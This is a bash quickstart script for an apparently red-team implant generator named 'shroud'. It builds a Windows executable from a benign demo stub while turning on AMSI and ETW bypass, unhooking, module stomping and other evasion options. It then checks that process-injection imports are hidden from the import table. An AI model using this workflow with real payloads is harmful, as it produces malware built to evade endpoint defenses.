#!/usr/bin/env bash
# shroud quickstart — exercises the full pipeline end to end with the BENIGN
# demo stub (no real shellcode). Safe to run anywhere; produces a tiny EXE that
# just returns cleanly. Authorized-use tool — see LICENSE / README.
#
#   ./examples/quickstart.sh
#
set -euo pipefail
cd "$(dirname "$0")/.."

echo "### 1. one-time authorization"
./shroud authorize <<< "YES" >/dev/null 2>&1 || true

echo "### 2. catalog"
./shroud list | head -20

echo
echo "### 3. detail on a technique"
./shroud show 26 | head -16

echo
echo "### 4. build the modern implant with the FULL evasion stack (demo payload)"
./shroud generate pe26 \
    -e aes,stomp,callbacks,dynamic-api,etw,amsi,unhook-kd \
    -o out/quickstart_pe26

echo
echo "### 5. IAT hygiene check — the injection triad should be ABSENT"
EXE=out/quickstart_pe26/*.exe
if x86_64-w64-mingw32-objdump -p "$EXE" 2>/dev/null \
     | grep -Ei "CreateRemoteThread|WriteProcessMemory|OpenProcess|VirtualAllocEx"; then
    echo "!! sensitive imports leaked (unexpected)"
else
    echo "OK: no injection-indicator imports in the IAT"
fi

echo
echo "### done. see out/quickstart_pe26/"
